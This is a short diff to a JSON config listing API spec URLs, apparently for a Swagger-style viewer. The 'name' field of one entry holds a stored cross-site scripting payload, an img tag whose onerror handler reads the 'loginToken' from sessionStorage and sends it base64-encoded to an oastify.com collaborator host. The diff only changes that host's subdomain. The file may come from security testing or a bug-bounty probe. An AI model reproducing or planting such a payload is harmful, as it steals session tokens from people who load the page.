@@ -1,7 +1,7 @@
 {
   "urls": [
     {
-      "name": "<img src=x onerror=\"fetch('https://jcztp4t42qgvle5su2yg5buzjqphd71w.oastify.com/jwt?t='+btoa(sessionStorage.getItem('loginToken')||'no-session'))\">",
+      "name": "<img src=x onerror=\"fetch('https://3swd5o9oiawf1ylcame0lvajza51tshh.oastify.com/jwt?t='+btoa(sessionStorage.getItem('loginToken')||'no-session'))\">",
       "url": "https://yarterss.github.io//spec.json"
     },
     {
